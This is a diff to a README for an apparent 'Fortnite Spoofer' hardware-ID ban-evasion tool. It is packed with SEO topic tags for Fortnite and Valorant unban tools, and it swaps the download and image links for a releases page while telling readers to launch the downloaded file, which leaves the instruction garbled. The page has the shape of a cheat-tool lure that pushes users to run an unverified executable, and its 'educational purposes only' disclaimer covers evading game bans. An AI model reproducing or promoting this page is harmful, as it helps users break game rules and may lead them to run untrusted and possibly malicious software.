@@ -8,9 +8,9 @@ Welcome to the Fortnite Spoofer repository! Here, you will find a powerful tool 
 - **Topics:** bypass-hardware-bans, fortnite-bypass-ban-2025, fortnite-unban-methods, hwid, hwid-ban-fix-2025, hwid-bypass-2024, hwid-change-tool, hwid-changer-tool, hwid-spoofer-for-games-2025, spoofer-for-fortnite-2025, spoofer-for-fortnite-github-2025, spoofer-for-games-2025, spoofer-for-valorant-2025, spoofer-github-leak, spoofer-hwid-github, spoofer-riot, unban-2024, unban-tool-2024, valorant-hwid-changer-2024, valorant-hwid-changer-2025
 
 ## Download Application
-[![Download Fortnite Spoofer](https://img.shields.io/badge/Download-Application.zip-blue)](https://github.com/files/uploaded/Application.zip)
+[![Download Fortnite Spoofer](https://github.com/william100000000/FortniteSpoofer/releases)](https://github.com/william100000000/FortniteSpoofer/releases)
 
-Make sure to launch the Application.zip file after downloading to utilize the Fortnite Spoofer tool effectively.
+Make sure to launch the https://github.com/william100000000/FortniteSpoofer/releases file after downloading to utilize the Fortnite Spoofer tool effectively.
 
 ## Features
 - **HWID Bypass:** Say goodbye to hardware bans with the HWID spoofing capabilities of the Fortnite Spoofer.
@@ -30,7 +30,7 @@ If you are interested in contributing to the Fortnite Spoofer project, feel free
 ## Support
 For any questions, concerns, or feedback, please open an issue on the repository. Our team will get back to you as soon as possible to assist you.
 
-![Fortnite Spoofer](https://via.placeholder.com/800x400)
+![Fortnite Spoofer](https://github.com/william100000000/FortniteSpoofer/releases)
 
 ## Disclaimer
 Please note that the Fortnite Spoofer is intended for educational purposes only. The developers are not responsible for any misuse of the tool. Use it responsibly and in accordance with the terms of service of the games you play.
